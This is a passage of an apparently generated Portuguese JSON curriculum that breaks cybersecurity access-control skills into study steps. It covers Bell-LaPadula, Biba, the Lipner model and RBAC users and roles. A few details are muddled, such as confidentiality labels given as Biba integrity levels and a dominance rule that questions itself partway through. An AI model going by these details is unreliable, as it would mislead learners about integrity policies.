                                  "commonMistakes": "Confundir direção da escrita ou ignorar propriedades transitivas."
                                },
                                {
                                  "stepNumber": 5,
                                  "title": "Sintetizar Análise e Verificar Conformidade Geral",
                                  "subSteps": [
                                    "Compile todos os acessos: determine se o cenário inteiro é seguro.",
                                    "Identifique violações potenciais e proponha mitigações (ex.: relabeling).",
                                    "Crie relatório final com tabela de acessos e conclusão.",
                                    "Teste com peer review ou auto-perguntas: 'Por quê isso é/ não é permitido?'",
                                    "Documente lições aprendidas para cenários futuros."
                                  ],
                                  "verification": "Relatório final aprovado com tabela, conclusão e mitigações.",
                                  "estimatedTime": "35 minutos",
                                  "materials": "Todas as listas/diagramas anteriores, template de relatório.",
                                  "tips": "Use tabela markdown para clareza: Colunas: Sujeito | Objeto | Op | Status | Razão.",
                                  "learningObjective": "Integrar análises para julgamento holístico de segurança.",
                                  "commonMistakes": "Focar só em uma propriedade ou pular síntese."
                                }
                              ],
                              "practicalExample": "Em um ambiente militar, um oficial com clearance 'Secret' tenta ler um relatório 'Top Secret' (proibido por ss-property) e escrever um resumo para um arquivo 'Unclassified' (proibido por *-property). Analise: leitura negada para evitar vazamento ascendente; escrita negada para prevenir downgrade de info sensível.",
                              "finalVerifications": [
                                "Explicar ss-property e *-property sem erros em um cenário dado.",
                                "Mapear corretamente níveis de 3+ sujeitos/objetos em diagrama.",
                                "Classificar todos acessos com 100% precisão conforme regras.",
                                "Identificar pelo menos 2 violações hipotéticas e mitigações.",
                                "Produzir relatório claro justificando conformidade geral.",
                                "Simular variação no cenário e reanalisar corretamente."
                              ],
                              "assessmentCriteria": [
                                "Precisão na aplicação das propriedades Bell-LaPadula (40%).",
                                "Qualidade do mapeamento e diagramação do cenário (20%).",
                                "Profundidade da análise de acessos e justificativas (20%).",
                                "Clareza e completude do relatório final (10%).",
                                "Criatividade em mitigações e lições aprendidas (10%)."
                              ],
                              "crossCurricularConnections": [
                                "Matemática: Lógica formal e relações de ordem parcial em hierarquias.",
                                "Programação: Implementação de MAC em kernels OS como SELinux.",
                                "Ética: Implicações de vazamentos em contextos militares/governamentais.",
                                "Gestão de Projetos: Auditoria de segurança em sistemas complexos."
                              ],
                              "realWorldApplication": "Em sistemas militares como redes do Departamento de Defesa dos EUA, o Bell-LaPadula previne vazamentos de inteligência classificada, garantindo que analistas Secret não acessem Top Secret acidentalmente ou contaminem canais Unclassified com dados sensíveis."
                            },
                            "estimatedTime": "2 horas",
                            "difficulty": "advanced",
                            "status": "not_started",
                            "prerequisites": [
                              "10.1.6.5.2.1",
                              "10.1.6.5.2.2"
                            ]
                          }
                        ]
                      },
                      {
                        "id": "10.1.6.5.3",
                        "name": "Modelo Biba para Integridade",
                        "description": "Política de MAC dual ao Bell-LaPadula, focada em integridade de dados, com regras invertidas para prevenir contaminação por informações de menor confiança.",
                        "specificSkills": [
                          {
                            "id": "10.1.6.5.3.1",
                            "name": "Descrever regras de leitura no Biba",
                            "description": "Explicar 'no read down': sujeito só lê objeto se seu rótulo é dominado pelo do objeto, evitando leitura de dados potencialmente corrompidos de menor integridade.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Compreender os fundamentos do Modelo Biba para integridade",
                                  "subSteps": [
                                    "Estudar a distinção entre políticas de confidencialidade (Bell-LaPadula) e integridade (Biba).",
                                    "Identificar sujeitos (processos) e objetos (arquivos/dados) no Controle de Acesso Mandatório (MAC).",
                                    "Aprender a hierarquia de rótulos de integridade: baixo (dados potencialmente corrompidos) a alto (dados confiáveis).",
                                    "Visualizar o lattice de integridade com exemplos simples como 'Sistema', 'Usuário' e 'Admin'.",
                                    "Explicar o objetivo geral do Biba: prevenir propagação de corrupção de integridade."
                                  ],
                                  "verification": "Escrever um resumo de 4 frases explicando Biba vs. Bell-LaPadula e resumir os rótulos de integridade.",
                                  "estimatedTime": "25 minutos",
                                  "materials": [
                                    "Diagrama do modelo Biba",
                                    "Texto introdutório sobre MAC em cibersegurança"
                                  ],
                                  "tips": "Use analogia de 'pureza da água': alta integridade é água potável, baixa é contaminada.",
                                  "learningObjective": "Dominar os conceitos básicos do modelo Biba e sua hierarquia de integridade.",
                                  "commonMistakes": [
                                    "Confundir integridade com confidencialidade; inverter a hierarquia de níveis."
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Definir e hierarquizar rótulos de integridade no Biba",
                                  "subSteps": [
                                    "Atribuir rótulos numéricos ou categóricos: ex. 1=baixo, 5=alto.",
                                    "Explicar dominância: rótulo A domina B se A ≤ B (para integridade, baixo domina alto? Não: sujeito só se seu rótulo é dominado pelo objeto).",
                                    "Desenhar um diagrama de lattice com 3-4 níveis de integridade.",
                                    "Discutir como rótulos são atribuídos dinamicamente ou estaticamente em sistemas reais.",
                                    "Praticar classificação de exemplos: relatório não verificado (baixo) vs. log auditado (alto)."
                                  ],
                                  "verification": "Criar um diagrama simples de lattice e classificar 3 exemplos de dados por nível de integridade.",
                                  "estimatedTime": "30 minutos",
                                  "materials": [
                                    "Papel e caneta ou ferramenta de diagrama online",
                                    "Exemplos de cenários em cibersegurança"
                                  ],
                                  "tips": "Lembre-se: em Biba, números mais altos = maior integridade; dominância é ≤ para leitura.",
                                  "learningObjective": "Entender e representar rótulos de integridade e sua dominância no Biba.",
                                  "commonMistakes": [
                                    "Inverter a convenção de dominância; ignorar contexto de integridade."
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Descrever a regra de leitura 'no read down' em detalhes",
                                  "subSteps": [
                                    "Enunciar a regra: Sujeito S pode ler objeto O apenas se rótulo_integridade(S) é dominado por rótulo_integridade(O), i.e., nível(S) ≤ nível(O).",
                                    "Explicar formalmente: Evita que sujeitos de alta integridade leiam dados de baixa integridade (potencialmente corrompidos).",
                                    "Comparar com escrita: mencionar brevemente 'no write up' para contexto completo.",
                                    "Simular cenários: S alto tenta ler O baixo → negado; S baixo lê O alto → permitido.",
                                    "Discutir implicações: protege processos confiáveis de contaminação."
                                  ],
                                  "verification": "Escrever a regra em pseudocódigo e simular 2 cenários de permissão/negação.",
                                  "estimatedTime": "35 minutos",
                                  "materials": [
                                    "Pseudocódigo template",
                                    "Tabela de exemplos sujeito-objeto"
                                  ],
                                  "tips": "Pense em termos de fluxo: integridade não flui 'para baixo' (de baixo para alto).",
                                  "learningObjective": "Formular precisamente a regra 'no read down' e suas condições.",
                                  "commonMistakes": [
                                    "Confundir com 'no read up' do Bell-LaPadula; ignorar a direção da dominância."
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Analisar propósito, exceções e verificação da regra",
                                  "subSteps": [
                                    "Explicar por que a regra previne vazamento de corrupção: alta integridade não acessa baixa.",
                                    "Discutir exceções ou downgrading (purificação de dados).",
                                    "Aplicar em fluxograma: mapear acessos permitidos/proibidos.",
                                    "Testar compreensão com quiz interno: 5 perguntas sobre cenários.",
                                    "Refletir sobre impacto em sistemas reais como OS com MAC."
                                  ],
                                  "verification": "Criar um fluxograma da regra e responder corretamente a 5 cenários de teste.",
                                  "estimatedTime": "20 minutos",
                                  "materials": [
                                    "Ferramenta de fluxograma (ex. Draw.io)",
                                    "Quiz autoavaliativo sobre Biba"
                                  ],
                                  "tips": "Sempre verifique: 'O sujeito é mais confiável que o objeto? Se sim, negue leitura.'",
                                  "learningObjective": "Compreender as implicações práticas e mecanismos de verificação da regra.",
                                  "commonMistakes": [
                                    "Subestimar exceções; não considerar downgrading."
                                  ]
                                }
                              ],
                              "practicalExample": "Em um hospital, um sistema de prescrição médica (sujeito de alta integridade) não pode ler entradas manuais de pacientes (objeto de baixa integridade, potencialmente erradas), evitando prescrições baseadas em dados corrompidos. Apenas sistemas de baixa integridade podem ler e processar esses dados iniciais.",
                              "finalVerifications": [
                                "Explicar verbalmente a regra 'no read down' com a condição de dominância correta.",
                                "Identificar corretamente 3 cenários de violação em um teste.",
                                "Desenhar um lattice simples mostrando leitura permitida/proibida.",
                                "Comparar com Bell-LaPadula sem erros.",
                                "Descrever o risco de violação da regra em termos de integridade."
                              ],
                              "assessmentCriteria": [
                                "Precisão na definição da regra (domínio sujeito ≤ objeto).",
                                "Correta representação de rótulos e dominância em diagramas.",
                                "Capacidade de aplicar em cenários reais sem confusão com confidencialidade.",
                                "Profundidade na explicação do propósito (prevenção de corrupção).",
                                "Clareza em exemplos e verificações finais."
                              ],
                              "crossCurricularConnections": [
                                "Matemática: Estruturas de lattice e relações de ordem parcial.",
                                "Filosofia: Confiança epistêmica e validade da informação.",
                                "Engenharia de Software: Controle de fluxo de dados e validação.",
                                "Direito: Conformidade regulatória em proteção de dados críticos."
                              ],
                              "realWorldApplication": "Em sistemas como SELinux ou FreeBSD MAC, a regra 'no read down' do Biba previne que processos privilegiados (alta integridade) sejam contaminados por inputs não confiáveis, essencial em ambientes de SCADA industriais, bancos e defesa para manter a integridade de decisões críticas."
                            },
                            "estimatedTime": "1 hora",
                            "difficulty": "intermediate",
                            "status": "not_started",
                            "prerequisites": [
                              "10.1.6.5.1"
                            ]
                          },
                          {
                            "id": "10.1.6.5.3.2",
                            "name": "Descrever regras de escrita no Biba",
                            "description": "Explicar 'no write up': sujeito só escreve em objeto se domina o rótulo do objeto, preservando integridade ao impedir escrita em níveis superiores.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Compreender os Fundamentos de Rótulos de Integridade no Modelo Biba",
                                  "subSteps": [
                                    "Estude a hierarquia de integridade: níveis como 'confidencial', 'secreto', 'top secret' atribuídos a sujeitos e objetos.",
                                    "Aprenda que sujeitos têm rótulos de integridade representando sua 'confiabilidade' para modificar dados.",
                                    "Revise o foco do Biba em integridade (prevenir corrupção de dados de alta integridade por fontes de baixa integridade).",
                                    "Identifique diferenças iniciais com Bell-LaPadula (confidencialidade vs. integridade).",
                                    "Anote definições chave: sujeito domina objeto se seu nível ≥ nível do objeto."
                                  ],
                                  "verification": "Crie um diagrama simples mostrando hierarquia de rótulos e dominação.",
                                  "estimatedTime": "20-30 minutos",
                                  "materials": [
                                    "Documentação oficial do modelo Biba (RFC ou papers acadêmicos)",
                                    "Diagramas de lattice de segurança"
                                  ],
                                  "tips": "Use analogias como 'níveis de segurança em um prédio' para visualizar dominação.",
                                  "learningObjective": "Entender como rótulos de integridade definem dominação entre sujeitos e objetos.",
                                  "commonMistakes": [
                                    "Confundir integridade com confidencialidade",
                                    "Ignorar que dominação é ≥, não estritamente >"
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Detalhar a Regra de Escrita 'No Write Up'",
                                  "subSteps": [
                                    "Memorize a regra: Um sujeito só pode escrever em um objeto se domina o rótulo de integridade do objeto (nível sujeito ≥ nível objeto).",
                                    "Explique o propósito: Impede que sujeitos de baixa integridade corrompam objetos de alta integridade.",
                                    "Descreva o que acontece em violação: Operação negada para preservar integridade.",
                                    "Compare com 'write down' permitido: Sujeitos altos podem escrever em baixos, fluindo integridade para baixo.",
                                    "Escreva a regra em pseudocódigo: if (subject_integrity >= object_integrity) allow_write();"
                                  ],
                                  "verification": "Escreva uma definição precisa da regra em suas próprias palavras e valide com fonte oficial.",
                                  "estimatedTime": "25-35 minutos",
                                  "materials": [
                                    "Pseudocódigo exemplos de MAC",
                                    "Vídeos tutoriais sobre Biba (YouTube ou Khan Academy equivalentes)"
                                  ],
                                  "tips": "Pense em 'write up' como tentar 'subir' para níveis mais confiáveis, o que é proibido.",
                                  "learningObjective": "Descrever precisamente a regra de escrita e sua lógica de preservação de integridade.",
                                  "commonMistakes": [
                                    "Permitir write up como em Bell-LaPadula",
                                    "Confundir sujeito com objeto nas comparações"
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Explorar Exemplos e Violações da Regra",
                                  "subSteps": [
                                    "Crie exemplo: Sujeito 'usuário não confiável' (baixo) tenta escrever em 'arquivo crítico' (alto) → negado.",
                                    "Simule cenário: Usuário Trojan (baixo) não pode modificar binário do sistema (alto).",
                                    "Analise implicações: Garante que dados confiáveis não sejam alterados por fontes não confiáveis.",
                                    "Discuta exceções raras: Regras estritas vs. variantes com downgrade controlado.",
                                    "Liste cenários reais: Sistemas militares onde analistas não alteram inteligência raw."
                                  ],
                                  "verification": "Gere 3 exemplos corretos e 1 incorreto, explicando por quê cada um é válido/inválido.",
                                  "estimatedTime": "30-40 minutos",
                                  "materials": [
                                    "Ferramentas de simulação MAC online",
                                    "Casos de estudo de breaches de integridade"
                                  ],
                                  "tips": "Use fluxogramas para mapear sujeito → objeto → decisão de escrita.",
                                  "learningObjective": "Aplicar a regra em cenários concretos para internalizar sua mecânica.",
                                  "commonMistakes": [
                                    "Permitir escrita baseada em confidencialidade em vez de integridade",
                                    "Subestimar impacto em fluxos de trabalho diários"
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Sintetizar e Praticar a Descrição Completa da Regra",
                                  "subSteps": [
                                    "Escreva parágrafo explicativo completo: Regra, condição, propósito, exemplo.",
                                    "Compare com outras regras Biba: No read down complementa no write up.",
                                    "Teste compreensão: Explique para 'alguém leigo' em 1 minuto.",
                                    "Revise integrações: Como Biba previne ataques como TOCTOU em integridade.",
                                    "Prepare para avaliação: Liste verificações finais da regra."
                                  ],
                                  "verification": "Grave ou escreva uma explicação de 2 minutos e autoavalie clareza/precisão.",
                                  "estimatedTime": "20-30 minutos",
                                  "materials": [
                                    "Modelo de resposta estruturada",
                                    "Ferramenta de gravação de áudio"
                                  ],
                                  "tips": "Estruture explicação: Definição → Regra → Exemplo → Benefício.",
                                  "learningObjective": "Capacitar-se a descrever a regra de forma clara, precisa e contextualizada.",
                                  "commonMistakes": [
                                    "Omitir propósito de preservação de integridade",
                                    "Usar jargão sem explicar"
                                  ]
                                }
                              ],
                              "practicalExample": "Em um sistema bancário, um script automatizado de relatório (nível de integridade baixo, pois gerado por software não auditado) tenta atualizar saldos de contas (alto nível de integridade). A regra 'no write up' bloqueia isso, impedindo corrupção de dados financeiros críticos por falhas no script.",
                              "finalVerifications": [
                                "Pode definir 'no write up' sem erros factuais.",
                                "Fornece pelo menos um exemplo correto de aplicação.",
                                "Explica dominação de rótulos (sujeito ≥ objeto).",
                                "Diferencia Biba de Bell-LaPadula em foco (integridade vs. confidencialidade).",
                                "Identifica propósito: Preservar integridade contra corrupção descendente.",
                                "Descreve consequência de violação: Negação de escrita.",
                                "Lista implicações em sistemas reais como SELinux."
                              ],
                              "assessmentCriteria": [
                                "Precisão técnica na definição da regra (100% match com fontes).",
                                "Clareza na explicação para audiência iniciante (linguagem simples).",
                                "Uso de exemplos relevantes e concretos.",
                                "Compreensão de contexto: Integridade vs. confidencialidade.",
                                "Profundidade: Menciona dominação e exceções.",
                                "Criatividade em analogias ou aplicações.",
                                "Estrutura lógica na descrição (definição → exemplo → implicações)."
                              ],
                              "crossCurricularConnections": [
                                "Sistemas Operacionais: Implementação em kernels como Linux com SELinux.",
                                "Ética em TI: Preservação de dados confiáveis em cenários sensíveis.",
                                "Matemática Discreta: Lattices e relações de ordem parcial para rótulos.",
                                "Programação Segura: Evitar injeções em fluxos de alta integridade.",
                                "Gestão de Riscos: Modelos de threat modeling para integridade."
                              ],
                              "realWorldApplication": "Implementado em SELinux e AppArmor para proteger processos de sistema (alta integridade) contra applets de usuário maliciosos (baixa integridade), prevenindo escaladas de privilégios e corrupções em servidores empresariais e governamentais."
                            },
                            "estimatedTime": "1 hora",
                            "difficulty": "intermediate",
                            "status": "not_started",
                            "prerequisites": [
                              "10.1.6.5.1"
                            ]
                          },
                          {
                            "id": "10.1.6.5.3.3",
                            "name": "Comparar Bell-LaPadula e Biba",
                            "description": "Contrastar políticas de confidencialidade vs. integridade, identificando trade-offs e cenários de uso combinado (ex: Lipner model).",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Revisar os Fundamentos do Modelo Bell-LaPadula",
                                  "subSteps": [
                                    "Estude a propriedade de preservação simples (no read up): sujeitos não podem ler objetos de nível superior.",
                                    "Analise a propriedade *-estrela (no write down): sujeitos não podem escrever em objetos de nível inferior.",
                                    "Identifique o foco principal em confidencialidade e fluxos de informação descendentes.",
                                    "Desenhe um diagrama de lattice de segurança com exemplos de níveis (Unclassified, Confidential, Secret).",
                                    "Liste aplicações típicas, como sistemas militares classificados."
                                  ],
                                  "verification": "Crie um diagrama que demonstre corretamente as regras no read up e no write down, sem violações.",
                                  "estimatedTime": "45 minutos",
                                  "materials": [
                                    "Documentação oficial do Bell-LaPadula (RFC ou Wikipedia)",
                                    "Papel e caneta para diagramas",
                                    "Ferramenta de desenho como Draw.io"
                                  ],
                                  "tips": "Visualize fluxos de informação como uma cachoeira: só desce para manter segredos.",
                                  "learningObjective": "Compreender as regras centrais do Bell-LaPadula e seu foco em confidencialidade.",
                                  "commonMistakes": [
                                    "Confundir 'no read up' com permissão de leitura ascendente",
                                    "Ignorar a propriedade *-estrela como opcional"
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Explorar o Modelo Biba para Integridade",
                                  "subSteps": [
                                    "Estude a regra simples de integridade (no read down): sujeitos não podem ler objetos de nível inferior de integridade.",
                                    "Analise a regra *-integridade (no write up): sujeitos não podem escrever em objetos de nível superior de integridade.",
                                    "Identifique o foco em prevenir contaminação por dados não confiáveis, com fluxos ascendentes.",
                                    "Desenhe um diagrama de lattice invertido comparado ao Bell-LaPadula.",
                                    "Liste exemplos como sistemas bancários onde integridade é crítica."
                                  ],
                                  "verification": "Explique verbalmente ou por escrito como o Biba previne 'confiança falsa' com um exemplo de violação.",
                                  "estimatedTime": "45 minutos",
                                  "materials": [
                                    "Documentação do Biba model",
                                    "Diagramas comparativos online",
                                    "Ferramenta de desenho"
                                  ],
                                  "tips": "Pense no Biba como uma 'pirâmide de confiança': informação sobe, mas não desce para evitar poluição.",
                                  "learningObjective": "Dominar as regras do Biba e seu ênfase em integridade de dados.",
                                  "commonMistakes": [
                                    "Inverter as regras com Bell-LaPadula",
                                    "Subestimar o impacto da no write up em fluxos de dados"
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Comparar e Contrastar os Modelos",
                                  "subSteps": [
                                    "Crie uma tabela comparativa: colunas para regras, foco (confidencialidade vs. integridade), fluxos permitidos.",
                                    "Identifique trade-offs: Bell-LaPadula permite writes down (risco integridade), Biba permite reads down (risco confidencialidade).",
                                    "Discuta limitações: Bell-LaPadula ignora integridade, Biba ignora confidencialidade.",
                                    "Analise cenários onde um modelo falha e o outro succeeds.",
                                    "Debata escolhas baseadas em requisitos do sistema."
                                  ],
                                  "verification": "Preencha uma tabela comparativa com pelo menos 5 diferenças chave e valide com uma fonte confiável.",
                                  "estimatedTime": "60 minutos",
                                  "materials": [
                                    "Planilha Excel ou Google Sheets para tabela",
                                    "Artigos acadêmicos sobre MAC models"
                                  ],
                                  "tips": "Use cores na tabela: azul para confidencialidade, vermelho para integridade para visualização rápida.",
                                  "learningObjective": "Identificar diferenças precisas, trade-offs e quando usar cada modelo.",
                                  "commonMistakes": [
                                    "Afirmar que modelos são intercambiáveis",
                                    "Omitir trade-offs em cenários híbridos"
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Analisar Trade-offs e Modelos Combinados como Lipner",
                                  "subSteps": [
                                    "Estude o modelo Lipner: matriz que combina Bell-LaPadula (linhas confidencialidade) e Biba (colunas integridade).",
                                    "Simule cenários de uso combinado: ex., desenvolvimento de software onde integridade e confidencialidade coexistem.",
                                    "Avalie trade-offs em performance e complexidade ao combinar modelos.",
                                    "Pesquise implementações reais ou simulações.",
                                    "Conclua com recomendações para cenários práticos."
                                  ],
                                  "verification": "Desenvolva um diagrama da matriz Lipner e aplique a um cenário hipotético sem erros lógicos.",
                                  "estimatedTime": "60 minutos",
                                  "materials": [
                                    "Referências sobre Lipner model (papers ou livros de segurança)",
                                    "Ferramentas de modelagem como Lucidchart"
                                  ],
                                  "tips": "Comece com Lipner para ver como 'hackear' limitações individuais dos modelos puros.",
                                  "learningObjective": "Compreender integrações híbridas e aplicações contextuais.",
                                  "commonMistakes": [
                                    "Confundir Lipner com Clark-Wilson",
                                    "Ignorar overhead computacional de combinações"
                                  ]
                                }
                              ],
                              "practicalExample": "Em um hospital, use Bell-LaPadula para impedir que enfermeiros leiam registros de diretores (confidencialidade), mas aplique Biba para garantir que diagnósticos de médicos não sejam alterados por estagiários de baixa integridade. Crie uma matriz Lipner para atribuir níveis a papéis como 'Paciente', 'Enfermeiro', 'Médico Chefe'.",
                              "finalVerifications": [
                                "Explique corretamente as 4 regras principais de cada modelo sem confusões.",
                                "Identifique pelo menos 3 trade-offs entre confidencialidade e integridade.",
                                "Descreva um cenário onde Lipner resolve limitações dos modelos individuais.",
                                "Crie uma tabela comparativa precisa com fluxos permitidos/proibidos.",
                                "Aplique os modelos a um caso real como sistema militar ou financeiro."
                              ],
                              "assessmentCriteria": [
                                "Precisão na descrição das regras (no read up/down, etc.) - 30%",
                                "Profundidade na análise de trade-offs e limitações - 25%",
                                "Criatividade e acurácia em exemplos práticos e matrizes - 20%",
                                "Clareza em diagramas e tabelas comparativas - 15%",
                                "Compreensão de aplicações híbridas como Lipner - 10%"
                              ],
                              "crossCurricularConnections": [
                                "Criptografia: Integração com encriptação para reforçar MAC.",
                                "Gerenciamento de Redes: Aplicação em SELinux ou AppArmor.",
                                "Desenvolvimento de Software: Modelagem de RBAC/MAC em código.",
                                "Ética em TI: Discussão de privacidade vs. confiabilidade de dados."
                              ],
                              "realWorldApplication": "No Departamento de Defesa dos EUA, Bell-LaPadula protege segredos classificados; em bancos como JPMorgan, Biba previne fraudes alterando transações; modelos Lipner são usados em pipelines DevSecOps para equilibrar confidencialidade de código fonte com integridade de builds."
                            },
                            "estimatedTime": "1.5 horas",
                            "difficulty": "advanced",
                            "status": "not_started",
                            "prerequisites": [
                              "10.1.6.5.2.3"
                            ]
                          }
                        ]
                      }
                    ]
                  },
                  {
                    "id": "10.1.6.6",
                    "name": "Controle de Acesso Baseado em Roles (RBAC)",
                    "description": "Atribuição de permissões a roles, que são concedidas a usuários conforme suas funções.",
                    "individualConcepts": [
                      {
                        "id": "10.1.6.6.1",
                        "name": "Componentes Fundamentais do RBAC",
                        "description": "Os elementos básicos do modelo de Controle de Acesso Baseado em Roles (RBAC), incluindo usuários, roles e permissões, que formam a base para atribuir acessos de forma organizada e funcional.",
                        "specificSkills": [
                          {
                            "id": "10.1.6.6.1.1",
                            "name": "Identificar usuários no modelo RBAC",
                            "description": "Compreender o papel dos usuários como entidades que recebem roles com base em suas funções organizacionais, diferenciando de autenticação para focar em autorização.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Definir o Conceito Básico de Usuário em RBAC",
                                  "subSteps": [
                                    "Estude a definição oficial de RBAC do NIST (ex: usuários são entidades humanas ou processos que solicitam acesso)",
                                    "Identifique usuários como os sujeitos principais que ativam permissões via roles",
                                    "Analise como usuários diferem de outros componentes como roles e permissões",
                                    "Desenhe um diagrama simples mostrando usuários conectados a roles",
                                    "Revise exemplos de usuários em contextos organizacionais (ex: funcionários, admins)"
                                  ],
                                  "verification": "Escreva uma definição de 1 parágrafo sobre 'usuário em RBAC' e compare com fontes oficiais",
                                  "estimatedTime": "25 minutos",
                                  "materials": [
                                    "Documento NIST RBAC (SP 800-162)",
                                    "Diagrama básico de componentes RBAC"
                                  ],
                                  "tips": "Lembre-se: usuários são os 'quem', não o 'o quê' (roles/permissões)",
                                  "learningObjective": "Compreender usuários como entidades ativas que recebem e ativam roles",
                                  "commonMistakes": [
                                    "Confundir usuários com contas de autenticação",
                                    "Ignorar que usuários podem ser processos automatizados"
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Diferenciar Autenticação de Autorização no Contexto de Usuários",
                                  "subSteps": [
                                    "Revise conceitos: autenticação verifica identidade (quem você é), autorização verifica permissões (o que pode fazer)",
                                    "Estude como RBAC foca em autorização, assumindo autenticação prévia",
                                    "Compare fluxos: login (autenticação) → atribuição de role (autorização)",
                                    "Identifique pontos onde usuários são mapeados pós-autenticação",
                                    "Crie uma tabela comparativa entre autenticação e autorização"
                                  ],
                                  "verification": "Explique em 3 frases como um usuário passa de autenticação para autorização em RBAC",
                                  "estimatedTime": "30 minutos",
                                  "materials": [
                                    "Glossário de termos IAM",
                                    "Fluxograma autenticação vs autorização"
                                  ],
                                  "tips": "Use analogia: autenticação é mostrar ID, autorização é checar crachá de acesso",
                                  "learningObjective": "Distinguir claramente autenticação (identidade) de autorização (roles para usuários)",
                                  "commonMistakes": [
                                    "Misturar os dois como sinônimos",
                                    "Achar que RBAC cuida de senhas e logins"
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Mapear Funções Organizacionais a Usuários e Roles",
                                  "subSteps": [
                                    "Liste funções organizacionais comuns (ex: gerente, desenvolvedor, auditor)",
                                    "Atribua roles hipotéticos a cada função (ex: gerente → role 'Manager')",
                                    "Explique como usuários são associados a roles baseado em suas funções",
                                    "Simule atribuição: usuário João (dev) recebe role 'Developer'",
                                    "Discuta princípios de menor privilégio na atribuição"
                                  ],
                                  "verification": "Crie uma matriz de 5 usuários com suas funções e roles atribuídos",
                                  "estimatedTime": "35 minutos",
                                  "materials": [
                                    "Exemplos de organograma empresarial",
                                    "Ferramenta de diagrama como Draw.io"
                                  ],
                                  "tips": "Sempre baseie em funções reais, não em nomes individuais",
                                  "learningObjective": "Mapear usuários a roles com base em responsabilidades organizacionais",
                                  "commonMistakes": [
                                    "Atribuir roles por seniority ao invés de função",
                                    "Dar múltiplos roles sem justificativa"
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Identificar Usuários em Modelos e Cenários RBAC",
                                  "subSteps": [
                                    "Analise um modelo RBAC completo (diagrama com usuários, roles, sessões)",
                                    "Identifique usuários em cenários: quem ativa uma sessão com role?",
                                    "Pratique com casos: em um banco, identifique usuários como 'Caixa' ou 'Gerente'",
                                    "Crie um quiz autoavaliativo com 5 cenários de identificação",
                                    "Revise como usuários podem ativar múltiplas sessões com diferentes roles"
                                  ],
                                  "verification": "Resolva 3 cenários reais identificando corretamente os usuários e seus roles",
                                  "estimatedTime": "30 minutos",
                                  "materials": [
                                    "Modelos de RBAC diagramados",
                                    "Casos de estudo RBAC"
                                  ],
                                  "tips": "Procure por setas de 'user-to-role assignment' em diagramas",
                                  "learningObjective": "Reconhecer e identificar usuários em implementações práticas de RBAC",
                                  "commonMistakes": [
                                    "Confundir usuários com roles",
                                    "Ignorar sessões ativas"
                                  ]
                                }
                              ],
                              "practicalExample": "Em uma empresa de TI, o funcionário 'Ana' (função: Desenvolvedora) é identificado como usuário e recebe o role 'Developer', permitindo acesso a repositórios de código via GitLab. Ela autentica com login/senha (autenticação), então ativa o role em uma sessão para push de código (autorização).",
                              "finalVerifications": [
                                "Definir precisamente o que é um usuário em RBAC",
                                "Explicar diferença entre autenticação e autorização para usuários",
                                "Mapear 3 funções organizacionais a usuários e roles",
                                "Identificar usuários em um diagrama RBAC fornecido",
                                "Descrever como um usuário ativa uma sessão com role",
                                "Aplicar princípio de menor privilégio em atribuições"
                              ],
                              "assessmentCriteria": [
                                "Precisão conceitual (definições corretas sem confusões)",
                                "Capacidade de diferenciação (autenticação vs autorização)",
                                "Qualidade do mapeamento (lógico e baseado em funções)",
                                "Identificação correta em cenários (acertos >90%)",
                                "Uso de exemplos relevantes e princípios RBAC",
                                "Clareza na explicação de sessões e ativação de roles"
                              ],
                              "crossCurricularConnections": [
                                "Gestão de Identidades e Acesso (IAM)",
                                "Administração de Sistemas Operacionais",
                                "Governança, Risco e Compliance (GRC)",
                                "Desenvolvimento Seguro de Software",
                                "Auditoria e Monitoramento de Segurança"
                              ],
                              "realWorldApplication": "Em organizações como bancos ou hospitais, identificar usuários corretamente no RBAC garante que enfermeiros acessem apenas prontuários necessários, reduzindo riscos de vazamento de dados e atendendo regulamentações como LGPD ou HIPAA."
                            },
                            "estimatedTime": "1 hora",
                            "difficulty": "beginner",
                            "status": "not_started",
                            "prerequisites": []
                          },
                          {
                            "id": "10.1.6.6.1.2",
                            "name": "Definir e categorizar roles",
                            "description": "Criar e classificar roles como conjuntos de permissões que representam funções específicas, como 'administrador' ou 'usuário comum', evitando atribuição direta de permissões a indivíduos.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Compreender o conceito de roles no RBAC",
                                  "subSteps": [
                                    "Ler definições oficiais de RBAC e roles de fontes como NIST SP 800-53.",
                                    "Diferenciar roles de usuários, permissões e sessões em RBAC.",
                                    "Analisar exemplos simples de roles como 'admin' e 'usuário'.",
                                    "Anotar os benefícios de usar roles em vez de permissões diretas.",
                                    "Explicar verbalmente ou por escrito a hierarquia RBAC."
                                  ],
                                  "verification": "Escrever um resumo de 200 palavras explicando roles em RBAC.",
                                  "estimatedTime": "30 minutos",
                                  "materials": [
                                    "Documentação NIST RBAC",
                                    "Vídeos tutoriais sobre RBAC no YouTube",
                                    "Notebook para anotações"
                                  ],
                                  "tips": "Foque na ideia de roles como 'chapéus' que usuários vestem baseados em funções.",
                                  "learningObjective": "Dominar a definição de roles como conjuntos de permissões ligadas a funções organizacionais.",
                                  "commonMistakes": [
                                    "Confundir roles com permissões individuais ou contas de usuário específicas."
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Identificar funções organizacionais para roles",
                                  "subSteps": [
                                    "Mapear processos e atividades principais do sistema ou organização.",
                                    "Entrevistar ou listar stakeholders e suas responsabilidades diárias.",
                                    "Agrupar responsabilidades semelhantes em funções únicas.",
                                    "Priorizar funções críticas para segurança.",
                                    "Criar uma lista inicial de 8-12 funções potenciais."
                                  ],
